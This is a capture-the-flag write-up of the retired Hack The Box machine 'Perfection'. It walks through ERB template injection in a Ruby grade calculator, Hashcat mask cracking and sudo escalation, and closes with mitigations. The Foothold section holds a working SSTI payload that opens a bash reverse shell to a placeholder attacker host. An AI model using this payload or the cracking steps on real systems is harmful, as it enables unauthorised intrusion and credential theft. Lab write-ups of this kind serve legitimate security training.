---
machine: Perfection
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, ruby, sinatra, ssti, hashcat, privesc]
---

# Perfection — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The grade calculator filters fields with a regex, but a newline allows an ERB expression in the category name. Ruby SSTI runs commands and yields a `susan` shell. The system holds a SQLite database with hashes and an email describing the password format; a Hashcat mask cracks it and `susan` can run any command as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` nginx with a weighted grade calculator.
- The application is Ruby/Sinatra and uses ERB.
- `feroxbuster` finds `/weighted-grade` and `/weighted-grade-calc`.

## Enumeration

- The code validates categories with `^[a-zA-Z0-9/ ]+$` and grades/weights with `^\d{1,2}$`.
- Validation uses `=~` without `\A`/`\z`, so a trailing newline allows extra content.
- The category is interpolated into an ERB template created in the handler.

## Foothold

Send a valid category followed by `%0a` and an ERB expression. The server evaluates it and runs the command.

```text
category1=Test%0a<%= system("bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'") %>
```

The shell runs as `susan`.

## Lateral movement

`/home/susan` holds `pupilpath_credentials.db`, a SQLite database with five users and SHA-256 hashes. An email in the application describes the password format: `susan_nasus_` followed by nine digits.

```bash
sqlite3 pupilpath_credentials.db 'select * from users;'
```

## Privilege escalation

Build a Hashcat mask for the format and crack `susan`'s hash. The password also works for `sudo`, which allows any command as root.

```bash
hashcat susan.hash -m 1400 -a 3 'susan_nasus_?d?d?d?d?d?d?d?d?d'
sudo -i
```

## Evidence

- Regex without anchors and a newline.
- ERB SSTI in the category.
- SQLite database with SHA-256 hashes.
- Email with the password format.
- Hashcat mask and root.

## Lessons learned

- A validation regex without `\A`/`\z` can be bypassed with a newline.
- Interpolating input into an ERB template is code execution.
- A known password format reduces the search space to a mask.
- Reusing the password for `sudo` turns a user shell into root.

## Mitigation and detection

- Validate with `\A...\z` and allowlists; never build templates from input.
- Use `ERB.new` only with trusted templates and escape values.
- Enforce password policies and never reuse credentials.
- Limit sudo rules and audit allowed commands.

## References

- [0xdf — Perfection](https://0xdf.gitlab.io/2024/07/06/htb-perfection.html)
- [IppSec — Perfection](https://www.youtube.com/watch?v=zcVCLoMsOKA)
- [Hack The Box — Perfection](https://app.hackthebox.com/machines/perfection)
